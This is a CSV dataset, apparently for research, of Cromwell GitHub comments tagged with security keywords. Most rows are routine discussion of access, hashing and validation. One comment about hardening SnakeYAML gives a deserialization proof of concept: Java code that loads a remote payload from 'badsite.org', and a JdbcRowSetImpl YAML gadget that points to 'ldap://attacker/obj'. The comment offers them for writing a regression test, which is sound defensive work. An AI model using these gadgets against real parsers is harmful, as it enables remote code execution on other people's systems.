quality_attribute,sentence,source,author,repo,version,id,keyword,matched_word,match_idx,wiki,url,total_similar,target_keywords,target_matched_words
Security,"> Engine support:. For streaming to/from the data storage system, the Arvados Keep data system means that the Arvados Crunch workflow manager doesn't have to wait for input files to be staged (copied) in. The Arvados Keep FUSE plugin only downloads data as the tool requests access to a particular offset. I don't think they co-schedule tasks (either on the same system or ""nearby"" nodes) for direct streaming yet",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3454#issuecomment-860446694:275,access,access,275,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3454#issuecomment-860446694,1,['access'],['access']
Security,"> I am having the same error with the example ""Using Data on S3"" on https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-examples/ . I have changed the S3 bucket name in the .json file to my bucket name, but the run still failed. After reporting running failure, I have got the same error message. I am using cromwell-48. The S3 bucket has all public access, and I was logged in as the Admin in two terminal windows, one running the server and the other submitting the job. The previous two hello-world example were successful. There is no log file in the bucket and in the cromwell-execution, the only file create was the script. There is no rc or stderr or stdout created. @blindmouse Were you able to resolve your issue? I am encountering the same problem. Thanks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-662080275:375,access,access,375,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-662080275,1,['access'],['access']
Security,"> I recommend using the call cache diff endpoint; > ; > ```; > GET ​/api​/workflows​/v1/callcaching​/diff; > ```; > ; > > This endpoint returns the hash differences between 2 completed (successfully or not) calls. Thank you, i will try it",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823727881:148,hash,hash,148,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823727881,1,['hash'],['hash']
Security,"> I'm trying to figure out how to get [travis?] to redo the travis build. Yeah, PRs 1333 and this 1334 currently have the same git hash. Try updating to a new git hash by ""touching"" the commit, and then force pushing:. ``` bash; git checkout jg_haircut_for_testkitspec && \; git commit --amend -C HEAD --date=now && \; git push -f origin HEAD; ```. NOTE: Add `-q` after each `git <command>` to quiet down the output.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1334#issuecomment-242259156:131,hash,hash,131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1334#issuecomment-242259156,2,['hash'],['hash']
Security,"> Is this because Pipelines API version 1 does not support buckets with requester pays? If so, why cannot Cromwell just say so?. Granted it's not in the error message itself, but the [page I linked](https://cromwell.readthedocs.io/en/stable/filesystems/GoogleCloudStorage/#requester-pays) states. > Pipelines API version 1 does not support buckets with requester pays, so while Cromwell itself might be able to access bucket with RP, jobs running on Pipelines API V1 with file inputs and / or outputs will not work. Pipelines API v1 is deprecated by Google and documentation for it is not maintained; new projects should always use v2. ---. As for the `gcloud` issue I've never done this particular operation personally, but I suspect you may have luck looking at the GCP docs or Stack Overflow. You could opt for [Terra](https://app.terra.bio/) which is basically a fully managed version of Cromwell (it configures Cromwell and all of this project stuff for you). Hope this helps.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665264424:411,access,access,411,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665264424,1,['access'],['access']
Security,"> Is this run on all jobs? If so Is it potentially something a user would want to turn off?. Yes, it runs on all jobs by default. I'm not sure if users would explicitly want to turn it off, since it doesn't interfere with anything as far as I can tell, and the pricing issue is virtually non-existent. > Also did you produce that graph manually? Is there a way to generate it easily for a workflow?. Yep, the graph can be easily produced through Stackdriver monitoring console with a few clicks, or a link to it can be constructed programmatically and exposed to the user. The graph is interactive, so there's no need to ""pre-render"" it - it is constructed dynamically by the monitoring console, based on user inputs and/or the link. > Can you include your monitor python/image code in this PR? Would be easier to maintain that way. Sure! Is there a folder path you'd prefer to keep it at? Perhaps I could put it under `supportedBackends/google/pipelines/v2alpha1/src/monitoring`?. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4510#issuecomment-451492862:552,expose,exposed,552,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4510#issuecomment-451492862,1,['expose'],['exposed']
Security,"> It looks like upgrading from `Constructor` to `SafeConstructor` does not make much difference. I wonder if it is due to Scala not having a `javax.script.ScriptEngineManager` or other difference in class loading?. Previously we (cwlviewer) were using a plain `Yaml()` object which defaults to the `Constructor`: https://bitbucket.org/asomov/snakeyaml/src/5e41c378e49c9b363055ac8b0386b69cb3f389d2/src/main/java/org/yaml/snakeyaml/Yaml.java#lines-66 and this led to the vulnerability. Perhaps you can construct a Scala proof of concept (and therefore test) by serializing the Scala equivalent of ; ``` java; URL[] urls = new URL[1];; urls[0] = new URL(""https://www.badsite.org/payload"");; ScriptEngineManager foo = new ScriptEngineManager(new java.net.URLClassLoader(urls));; yaml.dump(foo);; ```. https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf suggests the following yaml to try as well:; ``` yaml; !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; autoCommit: true; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932291331:974,attack,attacker,974,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932291331,1,['attack'],['attacker']
Security,"> Just a couple of questions about using `flatMetadata` at all (eg we have a way of comparing the real json results directly, why go through all that indirection which may or may not do the right thing?). I kinda like the concept of more DSL-ish validation with flat metadata, as opposed to comparison of raw jsons. But probably it's excessive here indeed, so I removed the `compareFlatMetadata`. method.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5436#issuecomment-595402100:246,validat,validation,246,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5436#issuecomment-595402100,1,['validat'],['validation']
Security,"> So if I fix that in my conf, the messages should go away,; right?. Yes. > Can I specify docker.hash-lookup.method in the workflow_options?. No, if that's something you'd like feel free to create a github issue :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321876895:97,hash,hash-lookup,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321876895,1,['hash'],['hash-lookup']
Security,"> TOL2: is it worth another ad-hoc hash/UUID here to connect the ""sending"" and ""result"" messages?. But there is hash in there:; `logger.info(s""Failed to execute GCS Batch request $batchCommandsHash"", failure)`. Or do you mean something else?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246900:35,hash,hash,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246900,2,['hash'],['hash']
Security,"> TOL: To me this feels like it’d be way neater if the EGIN had a field or def called inputFileName nameInInputSet, to encapsulate all this into the egin itself rather than having to add it later externally?. Good point, I was just reticent to the idea of jamming yet another attribute injected by the language that will only ever be used once during the lifetime of the workflow but I agree it's still neater. > FWIW in my ideal world we’d have pluggable languages which should only need to define one function like “readWorkflowIntoWom(content: String, l: Set[ImportResolver]): WomExecutable” and everything else would be included/encapsulated in that result. Yes but there would be some non-DRYness by having each language implement entirely how they ingest inputs (most of the logic is the same), plus having it in WOM guarantees that all EGIN are handled the same way w.r.t coercion, validation etc.. It could use some refactoring though I agree",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2988#issuecomment-349344402:286,inject,injected,286,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2988#issuecomment-349344402,2,"['inject', 'validat']","['injected', 'validation']"
Security,"> The `singleWorkflowRunner` and `dockerDeadlock` sub-builds both failed on the last PR run. I was seeing weird errors with `dockerDeadlock` on my builds yesterday that I eventually got past by restarting the builds, but the `singleWorkflowRunner` errors look more suspicious to me. The problem was caused by the fact that singleWorkflowRunner tests rely on application's log messages for validation and the first fix attempt broke logging: `CromwellEntryPoint.buildCromwellSystem` was calling `initLogging` method to tamper with system properties before logback initialization. Then I moved `validateRunArguments` call to happen before the `buildCromwellSubsystem`, but turned out that `validateRunArguments` triggered logback initialization before system properties have been modified, thus making logback misconfigured.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5236#issuecomment-544104556:389,validat,validation,389,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5236#issuecomment-544104556,3,['validat'],"['validateRunArguments', 'validation']"
Security,"> This fixes the problem at the point of expression evaluation... it seems like it might be easier (and a lot less fiddly?) to do the relative file resolution much earlier, at the point that inputs are being read in to the workflow in the first place. > The ValidatedWomNamespace produced as part of workflow materialization contains a womValueInputs field... I wonder whether performing this mapping as part of creating that validated set of inputs would work?. Great suggestion. I will take a look at this. I can checkout the test case on a new branch and try to hack there. One of the catches will be that this resolving will be backend dependent. In the current situation the input expressions are evaluated first, and after that the inputs are resolved. (This makes sense because input can also be something like `baseDir + ""/my_file.txt""`, which needs to be evaluated). But indeed this could be bypassed by doing this already at the workflow level, before it gets passed down to the task level. I will take a look at this. If it does not work, (or work easily) then I will report back here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618838024:258,Validat,ValidatedWomNamespace,258,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618838024,2,"['Validat', 'validat']","['ValidatedWomNamespace', 'validated']"
Security,> With the new caching heuristic for generating File input hashes (path+modtime) relies on soft-linking for it to work correctly. Having soft-links disabled by design when containerizing a task makes this option mood. The hash is calculated based on the original path. Not on the relocalized path. So this should not be an issue.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2620#issuecomment-482565332:59,hash,hashes,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2620#issuecomment-482565332,2,['hash'],"['hash', 'hashes']"
Security,"> got an example of a fork in the liquibase scripts?. > One workaround that I'm already using in a couple of places is having a separate changeSet specific to postgres. See this link: http://www.liquibase.org/2009/03/what-effects-changeset-checksums.html. Those ""couple of places"" are likely the ""forks"" @geoffjentry was referring to. Additional changesets are fine, but ""adjusting the database migrations"" will add additional setup and test criteria regarding the MD5s. Here are two examples:. https://github.com/broadinstitute/cromwell/blob/70cff69799f149191bdaec5d8878dd2a3d5202b7/database/migration/src/main/resources/changesets/sync_not_null_constraints.xml#L20-L36. https://github.com/broadinstitute/cromwell/blob/70cff69799f149191bdaec5d8878dd2a3d5202b7/database/migration/src/main/resources/changesets/lengthen_wdl_value.xml#L5-L15. At minimum for the former changelog I suspect that fixes for Postgres (and [MariaDB](https://github.com/broadinstitute/cromwell/issues/4618) 🤔) will probably change the MD5s. As the link at the top says, there are workarounds to update/ignore the MD5s. But those workarounds will need to be implemented and CI tested-- along w/ [Postgres support](https://docs.travis-ci.com/user/database-setup/#postgresql).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4759#issuecomment-475014616:240,checksum,checksums,240,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4759#issuecomment-475014616,1,['checksum'],['checksums']
Security,"> it seems like we would want to continue seeing it; @aednichols; The bug in Life Sci API is that the ssh server is supposed to be disabled on the VM, but in some cases it is not, causing the `address already in use` problem. Since the ssh server is not disabled, ssh access to the VM is in fact possible. The error then becomes meaningless: the dockerized ssh server is unrelated to the wdl workflow, and users can still ssh to the VM.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6771#issuecomment-1139961597:268,access,access,268,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6771#issuecomment-1139961597,1,['access'],['access']
Security,> not sure why this was showing all green with only one review 🤔. PullApprove audits are always available via the `code-review/pullapprove` [Details](https://pullapprove.com/broadinstitute/cromwell/pull-request/3691/) links. In this case the change fell into `groups.one_reviewer` because of `groups.two_reviewers.conditions.files.exclude: centaur/*`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3691#issuecomment-392093770:78,audit,audits,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3691#issuecomment-392093770,1,['audit'],['audits']
Security,"> the tutorial, right in the section describing the configuration file for PAPIv1, neither states this simple fact about Requester Pays not working with PAPIv1. We should probably remove the PAPIv1 tutorial entirely, it has carried the deprecation warning for over a year now. It lives [here](https://github.com/broadinstitute/cromwell/blob/develop/docs/tutorials/PipelinesApi101.md) and we will gladly merge improvement PRs. > My best guess is that, albeit extremely counter-intuitive, I have access to this bucket with my personal account but I do not have access to this bucket with my service account. Oh my, this is so complicated ... That does seem like a probable explanation, though I don't know the particulars of how you set up your SA. Cloud architecture is a large beast and Cromwell targets a very specific cross section of it (running workflows). A particular account having access to input data would need to be configured as a prerequisite. Since I see you are at Broad, perhaps BITS can help with it. > `storage.objects.list` issue. I recommend trying to recreate the scenario locally with `gsutil cp` and the desired service account & file. Your turnaround time will be much faster than running the workflow. It is certainly possible that Cromwell has a bug that causes GCS to incorrectly deny access, but we generally would like to see the same file/account combination working correctly outside of Cromwell before we will accept it as a bug report.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665310550:494,access,access,494,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665310550,8,['access'],['access']
Security,">I assume that we're using the service registry + a whole new actor with the expectation that eventually we'll be calling some external service?. @aednichols that is correct. Once ECM supports returning Github tokens, this will be updated to actually call the new ECM endpoint instead of getting access token from the config.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7365#issuecomment-1955000123:296,access,access,296,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7365#issuecomment-1955000123,1,['access'],['access']
Security,">This change appears to validate the format of the disk requirements but then do nothing with the actual values? Is that correct?. AWS has auto-sizing and auto-expanding disks, so the concept of specifying a disk size is not applicable in this universe. This PR lets Cromwell ignore everything after `local-disk` instead of issuing an error. >Can we update the test cases which now work? I suspect custom_mount_point at least could be re-enabled?. `custom_mount_point` is not on the excluded list in `testCentaurAws.sh`. Are you requesting new coverage by adding `awsbatch` to the backends for `custom_mount_point.test`?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4863#issuecomment-485902441:24,validat,validate,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4863#issuecomment-485902441,1,['validat'],['validate']
Security,@DavyCats I sent you an invitation! Let me know if you run into any issues with access,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4965#issuecomment-498294904:80,access,access,80,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4965#issuecomment-498294904,1,['access'],['access']
Security,"@EvanTheB thanks for this report! . I've [added a test](https://github.com/broadinstitute/cromwell/pull/3867) to make sure this check happens during static validation and amended the error message. I'll link this issue so that it gets closed when the PR merges, are you all set with how to fix the problem in your expression?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3863#issuecomment-402842188:156,validat,validation,156,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3863#issuecomment-402842188,1,['validat'],['validation']
Security,"@Horneth . > Is there an equivalent for JES runtime attributes validation that could need an update as well ?. Not that I can think of. JES's runtime attributes are [hardcoded](https://github.com/broadinstitute/cromwell/blob/23/supportedBackends/jes/src/main/scala/cromwell/backend/impl/jes/JesRuntimeAttributes.scala#L19-L28) into the scala code. Meanwhile, these are the declarations of runtime attributes for the Config based backend. Via the config, one can specify the list of valid runtime attributes for _your_ backend, PBS, LSF, SGE, etc. See #1737 for an example of where this was broken.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1738#issuecomment-264924049:63,validat,validation,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1738#issuecomment-264924049,1,['validat'],['validation']
Security,"@Horneth @cjllanwarne sure we can make the choice of auths explicit in `genomics` and `filesystems`. I did want to keep it clear in the config which auth was for Cromwell and which was for the user so we didn't make it impossible to implement call log copying in FireCloud (in case someday we want to use that feature there). How about something like the following for FireCloud:. ``` hocon. // Same as the preceding FireCloud sample conf; google {; application-name = ""cromwell"". // There may be instances like the final call that copies call logs which will need to be able to generate both; // Cromwell and user authentication, so making these explicit.; cromwellAuthentication {; scheme = ""application_default""; }. // Used for engine functions involving the filesystem.; userAuthentication {; scheme = ""refresh""; client-id = ""secret_id""; client-secret = ""secret_secret""; }; }. // genomics with explicitly selected conf; genomics {; ...; auth = ""cromwell""; ...; }. ...; filesystems = [; // gcs filesystem with explicitly selected conf; gcs {; auth = ""user""; }; ]; ... ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203469472:615,authenticat,authentication,615,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203469472,2,['authenticat'],['authentication']
Security,@Horneth @geoffjentry As per our discussion. Tell me if you need access to the VM...,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1480#issuecomment-249210875:65,access,access,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1480#issuecomment-249210875,1,['access'],['access']
Security,@Horneth I assume for now we're still *recording* all the individual hashes even though we don't currently ever look at them? . So if we did need to back out of this we could just reinstate this and be good to go?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4121#issuecomment-423575324:69,hash,hashes,69,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4121#issuecomment-423575324,1,['hash'],['hashes']
Security,@Horneth I don't think you want to assume production will be an easier environment than unit tests :). What if every actor had its own data access? Within a workflow the overhead of doing so shouldn't be high,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143031435:140,access,access,140,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143031435,1,['access'],['access']
Security,"@Horneth The more I'm thinking about this I'm transitioning from ""throwing something out there"" to ""advocating"" :). What bothers me about this is that eventually we're going to want workflow submission also go through the same validation actor instead of doing it in multiple ways. Typically you want actor ownership to be hierarchical in nature but this way you'd have multiple parent types. Something to consider - what happens if a VA throws an exception under this model? You'll now need to have supervision code in multiple places. More abstractly what will be said is that validation is A Thing, but needs to exist independently in multiple places - if that's the case it should be pulled out into its own block. Furthermore the validation actor should be the sort of actor which is perfect for being its own concept - it's a completely idempotent, stateless operation. Work gets sent to it, it process the work and responds to the querier. My point about supervision is that by Right Now defining A Validation Actor (presumably owned by the kernel) what you're effectively doing is defining a validation interface. You can change how things are implemented in the future (e.g. it's really a bunch of VAs, it's firing up ephemeral VAs, whatever) and not need to change any code throughout the rest of the system as everything is still talking to the same actorRef that they were before. Alternatively if validation actors are being spun up on demand in multiple places and we decide that we somehow need to handle VAs in a special manner, it'll be a larger refactor. All that said, at the moment only the validation webservice is talking to the VA. I'm happy to shelve this until when something else is talking to VAs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195419168:227,validat,validation,227,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195419168,7,"['Validat', 'validat']","['Validation', 'validation']"
Security,"@Horneth There are certainly tradeoffs and I don't disagree w/ what you said. However consider the flip side - by defining A Validation Actor you're allowing for more granular control over performance and fault tolerance down the road, e.g. you could replace it with a router talking to a bank of VAs and doing load balancing, fiddle with its own threadpool, provide validation specific supervision in case of error, etc.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195399500:125,Validat,Validation,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195399500,2,"['Validat', 'validat']","['Validation', 'validation']"
Security,"@Horneth To play devil's advocate against myself - a bit, as this doesn't matter if it's a short lived or long lived VA, in a world where we want both the validation API and submission to go through the validation actor (reclal that currently submission validation is done by the WMA) the submission endpoint could send the work to the VA who then sends it to the WMA if it is OK. That would at least make the VA fully under the umbrella of the webservice portion of the actor system",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195427960:155,validat,validation,155,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195427960,3,['validat'],['validation']
Security,@Horneth can you explain more about what the problem is with the Docker hash lookups?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2329#issuecomment-332640764:72,hash,hash,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2329#issuecomment-332640764,1,['hash'],['hash']
Security,"@Horneth commented on [Mon Sep 11 2017](https://github.com/broadinstitute/wdl4s/issues/202). The CWL parser currently hardcode the same name for all workflows.; Find out if CWL has a way to specify a workflow name. If not use a hash ? A new endpoint parameter ?; @katevoss this could use PO input if it turns out CWL has no way to specify a workflow name. ---. @danbills commented on [Tue Oct 03 2017](https://github.com/broadinstitute/wdl4s/issues/202#issuecomment-333894259). So it turns out that CWL v1.0.2 has an `id` field for Workflow, and cwltool gives us one for free:. http://www.commonwl.org/v1.0/Workflow.html#Workflow. so we should update the model to have a required `id: String` and this problem goes away. ---. @danbills commented on [Tue Oct 03 2017](https://github.com/broadinstitute/wdl4s/issues/202#issuecomment-333894392). This also applies to `CommandLineTool`, cwltool pre-processing gives us one.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2728:228,hash,hash,228,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2728,1,['hash'],['hash']
Security,"@Horneth in CromIAM we already have access to the entity bytes, so the plan (at least initially) is to read that in as a Query result, find out which IDs can be seen by the requester, and then make a new entity out of the filtered results",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2501#issuecomment-318490274:36,access,access,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2501#issuecomment-318490274,1,['access'],['access']
Security,@Horneth then it sounds like it's no longer the case that Cromwell doesn't check if a job is complete before calculating the hash when restarting. In that case I'll close it unless there are objections.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1441#issuecomment-327920051:125,hash,hash,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1441#issuecomment-327920051,1,['hash'],['hash']
Security,@KevinDuringWork Were you able to validate this work before. Is your team utilizing this?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6225#issuecomment-887602522:34,validat,validate,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6225#issuecomment-887602522,1,['validat'],['validate']
Security,"@LeeTL1220 -- I'm not sure what to do with this... have you seen it again? Seems like the timing diagram is fine, but that the underlying metadata was incorrect somehow... and I'm guessing we can't reproduce this and don't have access to the data any longer?. @cjllanwarne -- is there an actionable ticket from your digging?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-262541364:228,access,access,228,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-262541364,1,['access'],['access']
Security,"@LeeTL1220 I'm still on this, not @ruchim. A couple days ago you asked what I changed to get the workflow to run for success and exit cleanly. I was having problems even getting the workflow to reach success with the given hash `cromwell-23-79f6e12-SNAPSHOT.jar`, as these outputs with spaces were causing errors:. ```; File purity_series_small_amp = ""purity_plots/purity_series_small_Small Amplifications.png""; File purity_series_small_del = ""purity_plots/purity_series_small_Small Deletions.png""; Array[File] purity_files = glob(""purity_plots/*""); ```. I've been investigating whether this failure is a problem with `glob()`s, or just the `File`s with spaces. . FYI swapping out the three elements for another set of files ""random"" files allowed the workflow to succeed, and cromwell exited cleanly in single workflow mode. ```; # hacked paths to allow downstream calls to still run; File purity_series_small_amp = ""purity_plots/purity_series_Amplifications.png""; File purity_series_small_del = ""purity_plots/purity_series_Deletions.png""; Array[File] purity_files = glob(""purity_plots/purity_series_*.png""); ```. If there's another hash besides `79f6e12` that causes cromwell to run with spaces, _finish successfully_, and then, let me know. **TL;DR I can either get `79f6e12` with the workflow to succeed & exit, or fail-- but not succeed and lock up.**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-262309116:223,hash,hash,223,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-262309116,2,['hash'],['hash']
Security,"@LeeTL1220 are you using `docker.hash-lookup.method = ""local""` ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321823273:33,hash,hash-lookup,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321823273,1,['hash'],['hash-lookup']
Security,"@LeeTL1220 my `reference.conf` database section looks correct:. ```; database {; # hsql default; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = ""jdbc:hsqldb:mem:${uniqueSchema};shutdown=false;hsqldb.tx=mvcc""; connectionTimeout = 3000; }. # mysql example; #driver = ""slick.driver.MySQLDriver$""; #db {; # driver = ""com.mysql.jdbc.Driver""; # url = ""jdbc:mysql://host/cromwell?rewriteBatchedStatements=true""; # user = ""user""; # password = ""pass""; # connectionTimeout = 5000; #}. # For batch inserts the number of inserts to send to the DB at a time; # insert-batch-size = 2000. migration {; # For databases with a very large number of symbols, selecting all the rows at once can generate a variety of; # problems. In order to avoid any issue, the selection is paginated. This value sets how many rows should be; # retrieved and processed at a time, before asking for the next chunk.; read-batch-size = 100000. # Because a symbol row can contain any arbitrary wdl value, the amount of metadata rows to insert from a single; # symbol row can vary from 1 to several thousands (or more). To keep the size of the insert batch from growing out; # of control we monitor its size and execute/commit when it reaches or exceeds writeBatchSize.; write-batch-size = 100000; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2217#issuecomment-298110016:462,password,password,462,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2217#issuecomment-298110016,1,['password'],['password']
Security,"@LeeTL1220 there is doc in the README and CHANGELOG (in this PR) on how to disable it.; For SGE, since it doesn't honor the docker runtime attribute I don't think there can be false positive because of that. ; On a backend that does honor the docker attribute, if a tag is used, then yes it can yield false positives if the tag is updated, since Cromwell won't lookup the hash.; There can be false negatives though on SGE, if you change the value of the docker attribute in the WDL, it won't call cache, although it could because SGE will ignore the docker value anyway.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2139#issuecomment-292010784:372,hash,hash,372,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2139#issuecomment-292010784,1,['hash'],['hash']
Security,"@MatthewMah commented on [Thu Jun 15 2017](https://github.com/broadinstitute/wdltool/issues/32). The following example passes validation, and I think it should not. I think validation should be able to identify that a nonexistent output field is trying to be read. . ```; workflow ShouldNotValidate{; 	call A{}; 	Array[File] simple = [A.nonexistent]; 	call B{ input:; 		in = simple; 	}; }. task A{; 	command{; 		echo ""A"" > out; 	}; 	output{; 		File out = ""out""; 	}; }. task B{; 	Array[File] in. 	command{; 		cat ${sep=' ' in}; 	}; 	output{; 	}; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2881:126,validat,validation,126,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2881,2,['validat'],['validation']
